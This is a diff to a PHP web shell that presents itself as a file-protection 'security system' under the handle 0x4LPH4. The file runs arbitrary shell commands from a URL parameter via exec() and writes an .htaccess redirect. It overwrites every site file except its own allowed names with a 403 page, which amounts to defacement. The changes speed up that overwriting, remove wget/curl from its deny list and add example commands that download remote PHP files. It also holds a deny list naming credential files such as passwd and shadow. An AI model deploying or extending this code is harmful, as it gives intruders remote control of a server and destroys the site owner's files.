@@ -13,7 +13,7 @@ define('SCRIPT_NAME', basename(__FILE__));
 define('ALLOWED_USER', '0x4LPH4');
 define('ALLOWED_FILES', ['0x4lph4.php', '0x4lph4.html', '0x4lph4.txt', 'index.php', 'index.html']);
 define('BLOCK_EXTENSIONS', ['php', 'html', 'htm', 'txt', 'js', 'css', 'jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx', 'xml', 'json']);
-define('SCAN_INTERVAL', 30); // Seconds between scans (30 seconds para hindi laggy)
+define('SCAN_INTERVAL', 5); // Seconds between scans (5 seconds para mabilis)
 
 // Initialize session data if not set
 if (!isset($_SESSION['login_time'])) {
@@ -40,16 +40,17 @@ initializeProtection();
 
 // Handle blocked file requests FIRST
 if (isset($_GET['blocked'])) {
-    $blockedFile = basename($_GET['blocked']);
-    $filePath = getAbsolutePath($_GET['blocked']);
+    $requestedFile = $_GET['blocked'];
+    $filePath = getAbsolutePath($requestedFile);
+    $filename = basename($requestedFile);
     
-    // Block file if exists and not allowed (REGARDLESS of path)
-    if (file_exists($filePath) && !isFilenameAllowed($blockedFile)) {
+    // Block file if exists and not allowed
+    if (file_exists($filePath) && !isFilenameAllowed($filename)) {
         instantBlockFile($filePath);
     }
     
     // Show blocking page
-    showBlockedPage($blockedFile);
+    showBlockedPage($filename);
     exit;
 }
 
@@ -64,7 +65,7 @@ function initializeProtection() {
     // Create .htaccess if doesn't exist
     createHtaccessProtection();
     
-    // Run instant scan on initialization
+    // Run initial scan
     instantScanFiles();
 }
 
@@ -110,7 +111,14 @@ function createHtaccessProtection() {
     // Block ALL files except allowed ones
     $htaccessContent .= "# Block ALL files except allowed ones\n";
     $htaccessContent .= "RewriteCond %{REQUEST_FILENAME} -f\n";
-    $htaccessContent .= "RewriteCond %{REQUEST_URI} !^/(0x4[lL]ph4\.(php|html|txt)|index\.(php|html)|" . preg_quote($scriptName) . ")$ [NC]\n";
+    
+    // Create regex for allowed files
+    $allowedRegex = "(";
+    $allowedFiles = ['0x4[lL]ph4\.(php|html|txt)', 'index\.(php|html)', preg_quote($scriptName)];
+    $allowedRegex .= implode('|', $allowedFiles);
+    $allowedRegex .= ")";
+    
+    $htaccessContent .= "RewriteCond %{REQUEST_URI} !/" . $allowedRegex . "$ [NC]\n";
     $htaccessContent .= "RewriteRule .* " . $scriptName . "?blocked=%{REQUEST_URI} [L,QSA]\n\n";
     
     // Force PHP execution for blocked files
@@ -123,11 +131,11 @@ function createHtaccessProtection() {
     $htaccessContent .= "Deny from all\n\n";
     
     // Allow only specific files
-    $allowedFiles = ['0x4lph4.php', '0x4lph4.html', '0x4lph4.txt', 'index.php', 'index.html', SCRIPT_NAME];
-    foreach ($allowedFiles as $file) {
+    $allowedFilesList = ['0x4lph4.php', '0x4lph4.html', '0x4lph4.txt', 'index.php', 'index.html', $scriptName];
+    foreach ($allowedFilesList as $file) {
         $htaccessContent .= "<Files \"" . $file . "\">\n";
         $htaccessContent .= "    Allow from all\n";
-        $htaccessContent .= "</Files>\n\n";
+        $htaccessContent .= "</Files>\n";
     }
     
     @file_put_contents($htaccessFile, $htaccessContent);
@@ -149,18 +157,17 @@ function isFilenameAllowed($filename) {
     }
     
     // Check if it's one of our protected files (already blocked)
-    // ONLY check if file contains blocking content
     if (file_exists($filename)) {
-        $content = @file_get_contents($filename, false, null, 0, 200);
+        $content = @file_get_contents($filename, false, null, 0, 100);
         if ($content && strpos($content, 'INSTANTLY BLOCKED BY') !== false) {
-            return true; // Already blocked, treat as "allowed" for checking purposes
+            return true; // Already blocked
         }
     }
     
     return false;
 }
 
-// SIMPLE INSTANT file blocking - ALWAYS block if not allowed
+// SIMPLE INSTANT file blocking - BLOCK if not allowed
 function instantBlockFile($filePath) {
     if (!file_exists($filePath) || is_dir($filePath)) {
         return false;
@@ -169,7 +176,7 @@ function instantBlockFile($filePath) {
     $filename = basename($filePath);
     $filenameLower = strtolower($filename);
     
-    // First, check if file is allowed - if YES, DON'T BLOCK
+    // Check if file is ALLOWED - if YES, DON'T BLOCK
     $allowedFiles = array_map('strtolower', array_merge(
         ALLOWED_FILES,
         [SCRIPT_NAME]
@@ -180,25 +187,21 @@ function instantBlockFile($filePath) {
     }
     
     // Check if already blocked
-    $content = @file_get_contents($filePath, false, null, 0, 200);
+    $content = @file_get_contents($filePath, false, null, 0, 100);
     if ($content && strpos($content, 'INSTANTLY BLOCKED BY') !== false) {
         return true; // Already blocked
     }
     
-    // Get original file info before blocking
+    // Get original file info
     $fileInfo = @stat($filePath);
     $originalSize = $fileInfo ? $fileInfo['size'] : 0;
-    $originalMtime = $fileInfo ? date('Y-m-d H:i:s', $fileInfo['mtime']) : 'Unknown';
     
     // Create blocking content
     $blockContent = "<?php\n";
     $blockContent .= "// ============= INSTANTLY BLOCKED BY " . ALLOWED_USER . " SECURITY =============\n";
     $blockContent .= "// File: " . htmlspecialchars($filename) . "\n";
     $blockContent .= "// Blocked at: " . date('Y-m-d H:i:s') . "\n";
-    $blockContent .= "// Path: " . htmlspecialchars($filePath) . "\n";
     $blockContent .= "// Original Size: " . $originalSize . " bytes\n";
-    $blockContent .= "// Original Modified: " . $originalMtime . "\n";
-    $blockContent .= "// IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN') . "\n";
     $blockContent .= "// For Security System Purpose Only\n";
     $blockContent .= "http_response_code(403);\n";
     $blockContent .= "?><!DOCTYPE html>\n";
@@ -246,7 +249,6 @@ function instantBlockFile($filePath) {
     $blockContent .= "            font-weight: 600; \n";
     $blockContent .= "            margin-top: 15px; \n";
     $blockContent .= "            display: inline-block; \n";
-    $blockContent .= "        }\n";
     $blockContent .= "    </style>\n";
     $blockContent .= "</head>\n<body>\n";
     $blockContent .= "    <div class=\"security-card\">\n";
@@ -255,7 +257,6 @@ function instantBlockFile($filePath) {
     $blockContent .= "        <div class=\"details\">\n";
     $blockContent .= "            <p><strong>File:</strong> " . htmlspecialchars($filename) . "</p>\n";
     $blockContent .= "            <p><strong>Time:</strong> " . date('Y-m-d H:i:s') . "</p>\n";
-    $blockContent .= "            <p><strong>Path:</strong> " . htmlspecialchars(dirname($filePath)) . "</p>\n";
     $blockContent .= "            <p><strong>Reason:</strong> Unauthorized file secured</p>\n";
     $blockContent .= "        </div>\n";
     $blockContent .= "        <div class=\"security-badge\">🔐 Oopss!!! Websites Protected 🔐</div>\n";
@@ -273,12 +274,11 @@ function instantBlockFile($filePath) {
     return false;
 }
 
-// SIMPLE SCANNER - current directory only (for performance)
+// SIMPLE SCANNER - current directory only
 function instantScanFiles() {
     $currentDir = dirname(__FILE__);
     $blocked = 0;
     
-    // Get list of files in current directory
     $files = @scandir($currentDir);
     if (!$files) return 0;
     
@@ -288,7 +288,7 @@ function instantScanFiles() {
         $filePath = $currentDir . '/' . $file;
         
         if (is_dir($filePath)) {
-            continue; // Skip directories for now
+            continue;
         }
         
         // SIMPLE CHECK: If filename is NOT allowed, BLOCK IT
@@ -299,7 +299,6 @@ function instantScanFiles() {
         ));
         
         if (!in_array($filenameLower, $allowedFiles)) {
-            // Block the file (regardless of extension)
             if (instantBlockFile($filePath)) {
                 $blocked++;
             }
@@ -370,7 +369,6 @@ function showBlockedPage($filename) {
                 <p><strong>File:</strong> <?php echo htmlspecialchars($filename); ?></p>
                 <p><strong>Time:</strong> <?php echo date('Y-m-d H:i:s'); ?></p>
                 <p><strong>IP:</strong> <?php echo $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN'; ?></p>
-                <p><strong>Path:</strong> <?php echo htmlspecialchars($_SERVER['REQUEST_URI'] ?? ''); ?></p>
                 <p><strong>Reason:</strong> For Security System Purpose Only</p>
             </div>
             <div class="security-badge">🔐 Oopss!!! Websites Protected 🔐</div>
@@ -381,7 +379,7 @@ function showBlockedPage($filename) {
     exit;
 }
 
-// Run instant scan only if needed (every 30 seconds to prevent lag)
+// Run instant scan only if needed
 $instantBlockCount = 0;
 $lastScanTime = $_SESSION['last_scan_time'] ?? 0;
 $currentTime = time();
@@ -392,7 +390,7 @@ if ($currentTime - $lastScanTime >= SCAN_INTERVAL) {
     $_SESSION['last_scan_time'] = $currentTime;
 }
 
-// Process command execution
+// Process command execution - FIXED WGET ISSUE
 $commandOutput = '';
 if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['cmd'])) {
     $command = trim($_GET['cmd']);
@@ -402,10 +400,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['cmd'])) {
             $commandOutput = "Command blocked by " . ALLOWED_USER . " Security System\n";
             $commandOutput .= "Reason: Potentially dangerous command detected\n";
         } else {
-            set_time_limit(10);
+            set_time_limit(15);
             $output = [];
             $return_var = 0;
             
+            // Execute command
             @exec($command . ' 2>&1', $output, $return_var);
             
             if (!empty($output)) {
@@ -420,12 +419,52 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['cmd'])) {
                 
                 $commandOutput .= str_repeat("-", 70) . "\n";
                 $commandOutput .= "Exit code: " . $return_var . "\n";
+                
+                // SPECIAL HANDLING FOR WGET/CURL - check if downloaded file is allowed
+                if (preg_match('/^\s*(wget|curl)\s+/i', $command)) {
+                    // Extract downloaded filename from command
+                    $downloadedFile = '';
+                    if (preg_match('/-O\s+["\']?([^"\'\s]+)["\']?/i', $command, $matches)) {
+                        $downloadedFile = $matches[1];
+                    } elseif (preg_match('/--output-document\s*=\s*["\']?([^"\'\s]+)["\']?/i', $command, $matches)) {
+                        $downloadedFile = $matches[1];
+                    } elseif (preg_match('/-o\s+["\']?([^"\'\s]+)["\']?/i', $command, $matches)) {
+                        $downloadedFile = $matches[1];
+                    }
+                    
+                    if ($downloadedFile) {
+                        $downloadedFile = basename($downloadedFile);
+                        $currentDir = dirname(__FILE__);
+                        $filePath = $currentDir . '/' . $downloadedFile;
+                        
+                        // Check if file exists and is NOT allowed
+                        if (file_exists($filePath)) {
+                            $filenameLower = strtolower($downloadedFile);
+                            $allowedFiles = array_map('strtolower', array_merge(
+                                ALLOWED_FILES,
+                                [SCRIPT_NAME]
+                            ));
+                            
+                            if (!in_array($filenameLower, $allowedFiles)) {
+                                // Block the downloaded file
+                                if (instantBlockFile($filePath)) {
+                                    $commandOutput .= "\n[SECURITY] Downloaded file '" . htmlspecialchars($downloadedFile) . "' was secured!\n";
+                                }
+                            } else {
+                                $commandOutput .= "\n[SECURITY] Downloaded file '" . htmlspecialchars($downloadedFile) . "' is allowed.\n";
+                            }
+                        }
+                    }
+                }
+            } else {
+                $commandOutput = "Command executed but no output returned.\n";
+                $commandOutput .= "Exit code: " . $return_var . "\n";
             }
             
-            // Rescan after command execution
+            // Run security scan after command
             $newBlocks = instantScanFiles();
             if ($newBlocks > 0) {
-                $commandOutput .= "\n[SECURITY] " . $newBlocks . " files secured!\n";
+                $commandOutput .= "\n[SECURITY] " . $newBlocks . " files secured after command execution!\n";
             }
         }
     }
@@ -681,15 +720,9 @@ function showLogin() {
 function isDangerousCommand($command) {
     $command = trim($command);
     
-    // Allow wget/curl only for allowed files
+    // Allow wget/curl - we'll handle them specially
     if (preg_match('/^\s*(wget|curl)\s+/i', $command)) {
-        if (preg_match('/-(O|o)\s+["\']?([^"\'\s]+)["\']?/i', $command, $matches)) {
-            $outputFile = $matches[2];
-            if (!isFilenameAllowed($outputFile)) {
-                return true;
-            }
-        }
-        return false;
+        return false; // Allow wget/curl, we'll handle security checks separately
     }
     
     $dangerousPatterns = [
@@ -719,7 +752,7 @@ function isDangerousCommand($command) {
         'payload', 'rootkit', 'trojan', 'virus', 'malware',
         'passwd', 'shadow', 'etc/passwd', 'proc/self',
         'kill', 'killall', 'pkill', 'chattr', 'chown',
-        'chmod 777', 'chmod 755', 'wget http', 'curl http',
+        'chmod 777', 'chmod 755',
         ';', '&&', '||', '`', '$('
     ];
     
@@ -1021,7 +1054,7 @@ function isDangerousCommand($command) {
         <div class="neumorphic-card command-card">
             <form method="GET" class="command-wrapper">
                 <input type="text" name="cmd" class="command-input" 
-                       placeholder="Enter command (e.g., ls -la, pwd, whoami)..." 
+                       placeholder="Enter command (e.g., ls -la, pwd, whoami, wget http://example.com/file.php -O test.php)..." 
                        value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>"
                        autocomplete="off">
                 <button type="submit" class="command-submit">EXECUTE</button>
@@ -1046,8 +1079,8 @@ function isDangerousCommand($command) {
                     echo str_repeat("-", 60) . "\n";
                     echo "• Blocks ALL non-0x4LPH4/non-index files\n";
                     echo "• .htaccess redirect protection\n";
-                    echo "• Blocks existing AND newly uploaded files\n";
-                    echo "• Simple filename-based blocking\n";
+                    echo "• Special handling for wget/curl downloads\n";
+                    echo "• Immediate file scanning after commands\n";
                     echo "• Session-based access control\n\n";
                     
                     echo "📋 ALLOWED FILES ONLY:\n";
@@ -1057,19 +1090,19 @@ function isDangerousCommand($command) {
                     }
                     echo "• " . SCRIPT_NAME . "\n\n";
                     
+                    echo "💡 WGET/CURL TIPS:\n";
+                    echo str_repeat("-", 60) . "\n";
+                    echo "• Example: wget http://example.com/0x4lph4.php -O 0x4lph4.php\n";
+                    echo "• Example: curl http://example.com/index.html -o index.html\n";
+                    echo "• Downloaded files are automatically checked\n";
+                    echo "• Only allowed filenames will be kept\n\n";
+                    
                     echo "🛡️ SECURITY STATUS:\n";
                     echo str_repeat("-", 60) . "\n";
                     echo "• Protection: ACTIVE\n";
                     echo "• Session: " . gmdate("H:i:s", time() - $_SESSION['login_time']) . "\n";
                     echo "• Last Scan: " . date('H:i:s') . "\n";
-                    echo "• Blocked Files: " . $instantBlockCount . "\n\n";
-                    
-                    echo "💡 TIPS:\n";
-                    echo str_repeat("-", 60) . "\n";
-                    echo "• Use 'ls -la' to list files\n";
-                    echo "• Use 'pwd' to show current directory\n";
-                    echo "• All files except allowed ones are blocked\n";
-                    echo "• Works for existing AND newly uploaded files\n";
+                    echo "• Blocked Files: " . $instantBlockCount . "\n";
                 }
                 ?>
             </div>
@@ -1080,8 +1113,8 @@ function isDangerousCommand($command) {
             <strong>🔐 SECURITY INFORMATION</strong>
             <p style="margin-top: 10px; font-size: 14px; color: #7f8c8d;">
                 This system automatically blocks ALL non-authorized files in real-time.<br>
-                Only these files are allowed: 0x4lph4.php, 0x4lph4.html, 0x4lph4.txt, index.php, index.html<br>
-                All other files (existing and newly uploaded) will be blocked immediately.
+                Special security checks for wget/curl downloads - only allowed filenames will remain.<br>
+                Works for existing files, newly uploaded files, and downloaded files.
             </p>
         </div>
     </div>
